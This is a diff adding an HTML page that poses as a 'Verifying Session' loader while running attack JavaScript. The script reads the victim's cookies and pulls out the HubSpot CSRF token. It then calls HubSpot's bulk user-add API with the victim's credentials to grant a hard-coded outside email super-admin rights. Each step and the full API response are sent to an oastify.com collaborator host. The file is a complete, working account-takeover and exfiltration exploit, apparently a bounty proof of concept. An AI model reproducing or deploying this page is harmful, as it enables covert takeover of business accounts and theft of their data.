@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Processing...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f8fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff7a59;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #status {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <h2>Verifying Session...</h2>
+        <div id="status">Please wait</div>
+    </div>
+
+<script>
+const EXFIL = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';
+const STATUS = document.getElementById('status');
+
+function log(msg) {
+    STATUS.textContent = msg;
+    new Image().src = EXFIL + '/?a=' + encodeURIComponent(msg);
+    console.log('[ATTACK]', msg);
+}
+
+log('1_attack_page_loaded');
+log('2_origin=' + window.origin);
+log('3_referrer=' + document.referrer.substring(0, 50));
+
+// Step 1: Check cookies
+const cookies = document.cookie;
+log('4_cookie_length=' + cookies.length);
+
+if (cookies.length === 0) {
+    log('ERROR_no_cookies');
+    STATUS.textContent = 'Session expired. Please log in again.';
+} else {
+    log('5_cookies_found');
+    
+    // Step 2: Extract CSRF token from cookies
+    const csrfMatch = cookies.match(/hubspotapi-csrf=([^;]+)/);
+    
+    if (!csrfMatch) {
+        log('ERROR_no_csrf_token');
+        STATUS.textContent = 'Authentication failed.';
+    } else {
+        const csrfToken = csrfMatch[1];
+        log('6_csrf_found=' + csrfToken.substring(0, 20) + '...');
+        
+        // Step 3: Extract portal ID from cookies or referrer
+        const portalId = '146256700'; // Your portal ID
+        
+        // Step 4: Prepare the payload
+        const payload = {
+            users: [{
+                email: "chorfimajd22@gmail.com", // YOUR EMAIL HERE
+                roleNames: ["super-admin"],
+                seatNames: ["core"],
+                firstName: "",
+                lastName: "",
+                permissionSetIds: []
+            }],
+            roleNames: ["super-admin"],
+            seatNames: ["core"],
+            permissionSetIds: [],
+            secondaryTeamIds: [],
+            forceWelcomeEmail: false,
+            sendSlackInvite: false,
+            sendWelcomeEmail: false
+        };
+        
+        log('7_payload_prepared');
+        
+        // Step 5: Make the API call
+        const url = `https://app-eu1.hubspot.com/api/app-users/v1/users/add/bulk?portalId=${portalId}&clienttimeout=14000&hs_static_app=settings-ui-users&hs_static_app_version=1.61066`;
+        
+        log('8_calling_api');
+        STATUS.textContent = 'Adding user...';
+        
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Hubspot-Csrf-Hubspotapi': csrfToken
+            },
+            credentials: 'include',
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            log('9_response_status=' + response.status);
+            
+            if (response.ok) {
+                log('SUCCESS_status_200');
+                STATUS.textContent = '✓ Verification complete';
+                return response.json();
+            } else {
+                log('FAILED_status=' + response.status);
+                STATUS.textContent = 'Verification failed';
+                return response.text();
+            }
+        })
+        .then(data => {
+            const dataStr = typeof data === 'string' ? data : JSON.stringify(data);
+            log('10_response=' + dataStr.substring(0, 200));
+            
+            // Exfiltrate full response
+            fetch(EXFIL + '/response', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: dataStr
+            });
+            
+            if (dataStr.includes('error') || dataStr.includes('Error')) {
+                log('ERROR_in_response');
+                STATUS.textContent = 'Error: ' + dataStr.substring(0, 100);
+            } else {
+                log('USER_ADDED_SUCCESSFULLY');
+                STATUS.textContent = '✓ User added successfully!';
+                
+                // Close window after success
+                setTimeout(() => {
+                    window.close();
+                }, 2000);
+            }
+        })
+        .catch(error => {
+            log('ERROR_fetch=' + error.message);
+            STATUS.textContent = 'Network error';
+            
+            new Image().src = EXFIL + '/?error=' + encodeURIComponent(error.message);
+        });
+    }
+}
+</script>
+</body>
+</html>
